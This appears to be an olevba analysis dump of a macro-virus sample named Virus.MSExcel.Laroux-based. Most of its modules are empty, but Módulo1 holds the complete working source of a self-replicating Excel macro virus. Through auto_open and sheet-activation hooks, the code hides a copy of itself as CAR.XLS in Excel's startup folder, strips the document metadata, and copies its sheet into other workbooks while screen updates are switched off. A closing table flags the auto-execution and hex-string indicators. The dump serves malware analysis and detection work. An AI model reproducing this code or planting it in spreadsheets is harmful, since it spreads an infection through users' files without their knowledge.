olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Laroux-based-1301362b4a7f4d9f5301e6bbf728571abca37992
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO EsteLibro.cls 
in file: Virus.MSExcel.Laroux-based-1301362b4a7f4d9f5301e6bbf728571abca37992 - OLE stream: '_VBA_PROJECT_CUR/VBA/EsteLibro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Hoja1.cls 
in file: Virus.MSExcel.Laroux-based-1301362b4a7f4d9f5301e6bbf728571abca37992 - OLE stream: '_VBA_PROJECT_CUR/VBA/Hoja1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Hoja2.cls 
in file: Virus.MSExcel.Laroux-based-1301362b4a7f4d9f5301e6bbf728571abca37992 - OLE stream: '_VBA_PROJECT_CUR/VBA/Hoja2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Hoja3.cls 
in file: Virus.MSExcel.Laroux-based-1301362b4a7f4d9f5301e6bbf728571abca37992 - OLE stream: '_VBA_PROJECT_CUR/VBA/Hoja3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Módulo1.bas 
in file: Virus.MSExcel.Laroux-based-1301362b4a7f4d9f5301e6bbf728571abca37992 - OLE stream: '_VBA_PROJECT_CUR/VBA/Módulo1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
































Sub auto_open()
    Application.OnSheetActivate = "check_files"
End Sub

Sub check_files()
    c$ = Application.StartupPath
    m$ = Dir(c$ & "\" & "CAR.XLS")
    If m$ = "CAR.XLS" Then p = 1 Else p = 0
    If ActiveWorkbook.Modules.Count > 0 Then w = 1
    whichfile = p + w * 10

Select Case whichfile
    Case 10
    Application.ScreenUpdating = False
    n4$ = ActiveWorkbook.Name
    Sheets("car").Visible = True
    Sheets("car").Select
    Sheets("car").Copy
    With ActiveWorkbook
        .Title = ""
        .Subject = ""
        .Author = ""
        .Keywords = ""
        .Comments = ""
    End With
    newname$ = ActiveWorkbook.Name
    c4$ = CurDir()
    ChDir Application.StartupPath
    ActiveWindow.Visible = False
    Workbooks(newname$).SaveAs FileName:=Application.StartupPath & "/" & "CAR.XLS", FileFormat:=xlNormal, Password:="", WriteResPassword:="", ReadOnlyRecommended:=False, CreateBackup:=False
    ChDir c4$
    Workbooks(n4$).Sheets("car").Visible = False
    Application.OnSheetActivate = ""
    Application.ScreenUpdating = True
    Application.OnSheetActivate = "car.xls!check_files"
    Case 1
    Application.ScreenUpdating = False
    n4$ = ActiveWorkbook.Name
    p4$ = ActiveWorkbook.Path
    s$ = Workbooks(n4$).Sheets(1).Name
    If s$ <> "cecilia" Then Workbooks("CAR.XLS").Sheets("car").Copy before:=Workbooks(n4$).Sheets(1) Else


    Application.OnSheetActivate = ""
    Application.ScreenUpdating = True
    Application.OnSheetActivate = "car.xls!check_files"
    End Select
End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     13 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Hoja
' 0085     13 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Hoja
' 0085     13 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Hoja
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

